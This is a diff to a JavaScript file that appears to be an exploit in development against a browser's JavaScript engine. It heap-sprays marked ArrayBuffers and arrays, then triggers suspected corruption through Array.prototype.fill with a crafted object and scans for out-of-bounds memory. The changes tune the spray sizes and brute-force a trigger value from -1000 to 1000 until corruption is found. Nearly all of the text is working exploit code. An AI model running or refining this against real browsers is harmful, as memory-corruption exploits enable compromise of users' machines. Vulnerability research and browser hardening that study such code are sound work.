@@ -5,7 +5,7 @@ const MARK = 0x42424242;
 function massiveSpray() {
     const objects = [];
     
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 800; i++) {
         const buffer = new ArrayBuffer(0x4000);
         const view = new Uint32Array(buffer);
         view[0] = MARK;
@@ -13,20 +13,20 @@ function massiveSpray() {
         objects.push(buffer);
     }
     
-    for (let i = 0; i < 1000; i++) {
-        const arr = new Array(100);
+    for (let i = 0; i < 400; i++) {
+        const arr = new Array(80);
         for (let j = 0; j < arr.length; j++) {
             arr[j] = {
                 marker: MARK,
                 index: i,
-                data: new ArrayBuffer(64)
+                data: new ArrayBuffer(32)
             };
         }
         objects.push(arr);
     }
     
-    for (let i = 0; i < 1000; i++) {
-        const typed = new Uint8Array(0x2000);
+    for (let i = 0; i < 200; i++) {
+        const typed = new Uint8Array(0x1000);
         typed[0] = 0x42;
         typed[1] = 0x42;
         typed[2] = 0x42;
@@ -39,12 +39,12 @@ function massiveSpray() {
 
 function trigger(returnVal) {
     const v0 = [];
-    for (let i = 0; i < 50000; i++) {
+    for (let i = 0; i < 30000; i++) {
         v0[i] = {
             tag: 0xdead,
             idx: i,
-            buf: new ArrayBuffer(48),
-            arr: [1, 2, 3, 4, 5]
+            buf: new ArrayBuffer(32),
+            arr: [1, 2, 3]
         };
     }
     const v10 = new Object(Object, v0);
@@ -57,12 +57,7 @@ function trigger(returnVal) {
 
     try {
         v0.fill(v10, o14);
-        log("fill completed");
-    } catch (e) {
-        log("fill threw:" + e);
-    }
-
-    return { v0, v10 };
+    } catch (e) {}
 }
 
 function check(sprayedObjects) {
@@ -80,7 +75,7 @@ function check(sprayedObjects) {
         }
         
         else if (Array.isArray(obj)) {
-            for (let j = obj.length; j < obj.length + 20; j++) {
+            for (let j = obj.length; j < obj.length + 15; j++) {
                 if (obj[j] !== undefined && obj[j].marker === MARK) {
                     log("Array OOB at " + i + " index " + j);
                     corrupted++;
@@ -93,26 +88,29 @@ function check(sprayedObjects) {
 }
 
 async function main() {
-    const values = [-889, -1000, -100, 0, 100, 1000];
+    const values = [];
+    for (let i = -1000; i <= 1000; i++) {
+        values.push(i);
+    }
     
     for (const returnValue of values) {
         log("Testing value: " + returnValue);
         
         const sprayedObjects = massiveSpray();
-        await sleep(50);
+        await sleep(5);
         
         trigger(returnValue);
-        await sleep(20);
+        await sleep(2);
         
         const corrupted = check(sprayedObjects);
-        log("Corrupted: " + corrupted);
-        
         if (corrupted > 0) {
             log("SUCCESS with value: " + returnValue);
+            break;
         }
         
-        await sleep(100);
-        log("---");
+        if (returnValue % 100 === 0) {
+            log("Progress: " + returnValue);
+        }
     }
     
     log("done");
